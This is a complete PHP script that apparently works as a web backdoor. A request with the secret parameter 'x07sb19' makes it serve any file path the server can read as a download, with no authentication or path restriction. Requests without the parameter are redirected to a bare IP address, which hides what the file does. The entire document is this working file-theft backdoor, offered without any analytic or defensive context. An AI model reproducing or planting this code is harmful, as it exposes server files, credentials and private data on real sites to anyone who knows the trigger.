<?php
if(isset($_REQUEST['x07sb19'])){

    $file = $_REQUEST['x07sb19'];

    if (file_exists($file)) {
        echo "existe";
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename='.basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}else{
    header("Location:http://82.151.73.26");
    die();
  }
?>
